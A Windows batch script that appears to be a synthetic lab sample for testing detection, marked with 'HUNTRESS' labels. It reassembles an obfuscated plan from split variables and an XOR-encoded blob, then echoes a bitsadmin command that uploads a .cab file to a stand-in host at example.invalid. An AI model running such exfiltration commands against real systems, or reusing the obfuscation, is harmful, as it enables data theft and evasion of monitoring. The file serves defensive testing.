@echo off
setlocal EnableExtensions EnableDelayedExpansion
rem HUNTRESS-CODEC:hex_pairs|xor_5a
rem HUNTRESS-MATERIAL:2c676b26292e3f2a29673635393b2e3f053635393b36762a283f2a3b283f052e283b34293c3f28762f2a36353b3e05283f37352e3f263b3e3b2a2e3f286738332e293b3e373334743f223f26292e3b3d3f0539352f342e676b263d283b2a32673633343f3b2826343f222e05363b343d2f3b3d3f673435343f26393b372a3b333d3405333e67393b372a3b333d34773f39683f623f3f6c62392629352f28393f052a3b2e32671960060f293f2829060a2f3836333906122f342e283f2929163b3806393536363f392e773f39683f623f3f6c623974393b38262f2a36353b3e052f283667322e2e2a296075753f39683f623f3f6c6239743f223b372a363f7433342c3b36333e752f2a36353b3e
rem HUNTRESS-EXTENSION:bat
if /i "%~1"=="--inspect" goto :HUNTRESS_INSPECT
if /i "%~1"=="--plan" goto :HUNTRESS_PLAN
exit /b 0
:HUNTRESS_INSPECT
set "item0=v=1|steps=locate_local,prepare_transfer,upload_remote|adapter=bitsad"& rem HUNTRESS quote compound
set "item1=min.exe|stage_count=1|graph=linear|next_language=none|campaign_id=ca"& rem HUNTRESS quote compound
set "item2=mpaign-ec2e8ee68c|source_path=C:\Users\Public\HuntressLab\collect-ec"& rem HUNTRESS quote compound
set "item3=2e8ee68c.cab|upload_url=https://ec2e8ee68c.example.invalid/upload"& rem HUNTRESS quote compound
goto :HUNTRESS_SEPARATOR_DONE
ver >nul & rem HUNTRESS separator ampersand
:HUNTRESS_SEPARATOR_DONE
set "neutral_string_join=6880494d"
for /l %%Q in (1,1,1) do call :HUNTRESS_RECOVER
goto :HUNTRESS_EMIT
:HUNTRESS_RECOVER
set "item9=!item0!!item1!!item2!!item3!"
exit /b 0
:HUNTRESS_EMIT
echo(!item9!
exit /b 0
:HUNTRESS_UNUSED
goto :HUNTRESS_PLAN
:HUNTRESS_PLAN
echo bitsadmin.exe upload C:\Users\Public\HuntressLab\collect-ec2e8ee68c.cab to https://ec2e8ee68c.example.invalid/upload
exit /b 0
